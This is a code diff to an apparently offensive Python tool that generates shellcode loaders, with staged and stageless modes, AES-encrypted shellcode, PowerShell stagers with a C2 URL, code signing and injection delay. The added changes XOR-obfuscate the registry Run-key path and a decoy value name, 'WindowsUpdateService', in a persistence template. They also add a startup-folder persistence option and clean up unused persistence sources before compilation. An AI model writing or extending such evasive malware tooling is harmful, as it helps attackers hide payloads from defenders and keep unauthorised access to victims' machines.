@@ -16,6 +16,30 @@ from argparse import ArgumentParser
 from core.utils import Colors, banner
 from core.encryption import Encryption
 
+def obfuscate_persistence_reg(filepath):
+    """Replace placeholders in persistence_reg.c with XOR encrypted strings."""
+    import random
+    # Random XOR key (1-255)
+    xor_key = random.randint(1, 255)
+    # Strings to obfuscate
+    strings = {
+        "REG_PATH": r"Software\Microsoft\Windows\CurrentVersion\Run",
+        "REG_VALUE_NAME": "WindowsUpdateService",
+    }
+    with open(filepath, "r") as f:
+        content = f.read()
+    # Replace XOR_KEY placeholder
+    content = content.replace("//#-XOR_KEY-#", f"#define XOR_KEY 0x{xor_key:02X}")
+    # Replace each string placeholder
+    for name, plain in strings.items():
+        enc = bytes([ord(c) ^ xor_key for c in plain])
+        enc_array = ', '.join(f"0x{b:02x}" for b in enc)
+        placeholder = f"//#-ENC_{name}-#"
+        replacement = f"unsigned char ENC_{name}[] = {{{enc_array}}};"
+        content = content.replace(placeholder, replacement)
+    with open(filepath, "w") as f:
+        f.write(content)
+
 def generate_powershell_stager(enc_payload, key, iv, c2_url=None):
     """
     Returns a tuple: (ps_script_content, one_liner_command)
@@ -198,7 +222,7 @@ def main():
     parser_staged.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: afloader")
     parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt shellcode via AES-128-CBC.")
     parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble function/variable names.")
-    parser_staged.add_argument("--persistence", choices=["reg", "task"], help="Add persistence via registry or scheduled task.")
+    parser_staged.add_argument("--persistence", choices=["reg", "task", "startup"], help="Add persistence via registry, scheduled task, or startup folder.")
     parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to PFX file for signing.")
     parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for PFX file.")
     parser_staged.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection.")
@@ -219,7 +243,7 @@ def main():
     parser_stageless.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: afloader")
     parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt shellcode via AES-128-CBC.")
     parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble function/variable names.")
-    parser_stageless.add_argument("--persistence", choices=["reg", "task"], help="Add persistence via registry or scheduled task.")
+    parser_stageless.add_argument("--persistence", choices=["reg", "task", "startup"], help="Add persistence via registry, scheduled task, or startup folder.")
     parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to PFX file for signing.")
     parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for PFX file.")
     parser_stageless.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection.")
@@ -298,6 +322,14 @@ def main():
                         f.write(data)
 
             print(Colors.green("[+] Template files modified!"))
+
+            # ------------------------------------------------------------------
+            # Remove all persistence .c files from build directory
+            # ------------------------------------------------------------------
+            for fname in os.listdir(dst_directory):
+                if fname.startswith("persistence_") and fname.endswith(".c"):
+                    os.remove(os.path.join(dst_directory, fname))
+                    print(Colors.light_yellow(f"[*] Removed {fname}"))
 
             # Spawn injection (add macro to all C/H files)
             if args.spawn:
@@ -463,6 +495,10 @@ def main():
                     else:
                         print(Colors.red(f"[!] staggered_reg.c not found: {staggered_src}"))
 
+                # Obfuscate persistence_reg.c
+                if args.persistence == "reg":
+                    obfuscate_persistence_reg(dst_persistence)
+
             # Compilation
             output_name = args.output if args.output else "afloader"
             if args.format == "EXE":
@@ -483,7 +519,7 @@ def main():
             print(Colors.green("[+] DONE!"))
 
     # ------------------------------------------------------------------
-    # Stageless Variant (identical changes)
+    # Stageless Variant
     # ------------------------------------------------------------------
     if args.commands == "stageless":
         print(Colors.green("[i] Stageless Payload selected."))
@@ -533,6 +569,14 @@ def main():
                         f.write(data)
 
             print(Colors.green("[+] Template files modified!"))
+
+            # ------------------------------------------------------------------
+            # Remove all persistence .c files from build directory
+            # ------------------------------------------------------------------
+            for fname in os.listdir(dst_directory):
+                if fname.startswith("persistence_") and fname.endswith(".c"):
+                    os.remove(os.path.join(dst_directory, fname))
+                    print(Colors.light_yellow(f"[*] Removed {fname}"))
 
             # Spawn injection (add macro to all C/H files)
             if args.spawn:
@@ -694,6 +738,10 @@ def main():
                         print(Colors.green("[+] Two-stage persistence enabled"))
                     else:
                         print(Colors.red(f"[!] staggered_reg.c not found: {staggered_src}"))
+
+                # Obfuscate persistence_reg.c
+                if args.persistence == "reg":
+                    obfuscate_persistence_reg(dst_persistence)
 
             # Compilation
             output_name = args.output if args.output else "afloader"
